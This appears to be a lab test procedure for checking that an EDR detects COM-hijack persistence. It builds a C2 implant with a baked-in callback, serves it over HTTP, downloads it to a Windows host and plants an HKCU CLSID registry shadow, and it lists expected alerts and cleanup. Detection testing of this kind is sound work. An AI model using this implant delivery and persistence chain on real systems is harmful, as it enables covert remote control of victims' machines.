# Test: Persistence — COM object hijacking (T1546.015)

**Chain:** shadow a system COM CLSID in HKCU so any process instantiating the class loads
**your** DLL — persistence triggered by normal OS activity, no autostart list entry.
The LockBit-grade persistence class.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

the registry shadow alone is what your auditor keys on.

**Victim (elevated PowerShell):** `.\test.ps1` (DLL path need not exist for the diff).

```powershell
New-Item HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32 -Force
Set-ItemProperty ...\InprocServer32 -Name "(default)" -Value "C:\Users\Public\comhost.dll"
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `PERS-COM` | critical | auditor: HKCU CLSID InprocServer32 pointing outside system dirs, vs baseline |

**Full chain (optional):** replace the target with a real proxy DLL (see
`../dll-sideload/` for the crate) — execution fires when explorer/COM instantiates the class.

**Cleanup:** global cleanup removes the key; manually:
`Remove-Item -Recurse HKCU:\Software\Classes\CLSID\{018D...}`.
